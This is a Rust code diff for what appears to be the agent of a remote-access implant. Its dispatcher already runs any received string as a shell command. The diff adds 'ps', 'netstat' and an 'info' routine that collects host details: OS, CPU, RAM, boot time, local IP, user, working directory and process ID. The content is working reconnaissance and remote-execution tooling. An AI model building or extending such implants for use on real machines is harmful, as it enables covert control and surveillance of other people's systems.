@@ -85,6 +85,9 @@ fn dispatch(raw: &str) -> String {
     let (cmd, args) = link_common::split_first(raw);
     match cmd {
         "whoami" => format!("{}@{}", username(), hostname()),
+        "info" => collect_system_info(),
+        "ps" => shell_exec("ps aux"),
+        "netstat" => shell_exec("netstat -an"),
         "shell" => shell_exec(args),
         _ => shell_exec(raw),
     }
@@ -102,4 +105,76 @@ fn shell_exec(cmd: &str) -> String {
         }
         Err(e) => format!("[-] {}", e),
     }
+}
+
+// ── System information ────────────────────────────────────────────────────────
+
+fn collect_system_info() -> String {
+    let mut info = Vec::new();
+
+    info.push(format!("OS: {}", platform_info()));
+
+    // Architecture
+    if let Ok(o) = Command::new("uname").arg("-m").output() {
+        let arch = String::from_utf8_lossy(&o.stdout).trim().to_string();
+        if !arch.is_empty() {
+            info.push(format!("Architecture: {}", arch));
+        }
+    }
+
+    info.push(format!("User: {}@{}", username(), hostname()));
+
+    // CPU model and core count
+    if let Ok(o) = Command::new("sysctl")
+        .args(["-n", "machdep.cpu.brand_string"])
+        .output()
+    {
+        let model = String::from_utf8_lossy(&o.stdout).trim().to_string();
+        if !model.is_empty() {
+            info.push(format!("CPU: {}", model));
+        }
+    }
+    if let Ok(o) = Command::new("sysctl")
+        .args(["-n", "hw.logicalcpu"])
+        .output()
+    {
+        let cores = String::from_utf8_lossy(&o.stdout).trim().to_string();
+        if !cores.is_empty() {
+            info.push(format!("CPU Cores: {}", cores));
+        }
+    }
+
+    // RAM (bytes → MB)
+    if let Ok(o) = Command::new("sysctl").args(["-n", "hw.memsize"]).output() {
+        if let Ok(bytes) = String::from_utf8_lossy(&o.stdout).trim().parse::<u64>() {
+            info.push(format!("RAM: {} MB", bytes / 1_048_576));
+        }
+    }
+
+    // Uptime
+    if let Ok(o) = Command::new("sysctl")
+        .args(["-n", "kern.boottime"])
+        .output()
+    {
+        let bt = String::from_utf8_lossy(&o.stdout).trim().to_string();
+        if !bt.is_empty() {
+            info.push(format!("Boot time: {}", bt));
+        }
+    }
+
+    // Local IP
+    info.push(format!("Local IP: {}", local_ip()));
+
+    info.push(format!("Process ID: {}", std::process::id()));
+
+    if let Ok(cwd) = std::env::current_dir() {
+        info.push(format!("Working Directory: {}", cwd.display()));
+    }
+
+    info.push(format!(
+        "Environment Variables: {}",
+        std::env::vars().count()
+    ));
+
+    info.join("\n")
 }
